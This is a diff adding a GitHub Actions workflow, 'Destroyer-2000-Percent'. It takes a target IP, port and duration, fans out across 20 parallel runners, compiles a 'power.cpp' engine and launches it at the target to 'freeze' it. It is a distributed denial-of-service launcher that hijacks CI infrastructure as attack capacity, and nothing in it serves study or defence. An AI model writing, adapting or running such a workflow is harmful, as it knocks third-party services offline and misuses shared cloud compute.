@@ -1,0 +1,33 @@
+name: Destroyer-2000-Percent
+on:
+  workflow_dispatch:
+    inputs:
+      host:
+        description: 'Target IP'
+        required: true
+      port:
+        description: 'Target Port'
+        required: true
+      time:
+        description: 'Duration'
+        required: true
+
+jobs:
+  Ultimate-Attack:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        node: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+    
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v3
+
+      - name: Auto-Compile Engine
+        run: |
+          g++ -O3 power.cpp -o power -pthread
+          chmod +x power
+
+      - name: Execute 2000% Freeze
+        run: |
+          ./power ${{ github.event.inputs.host }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }}
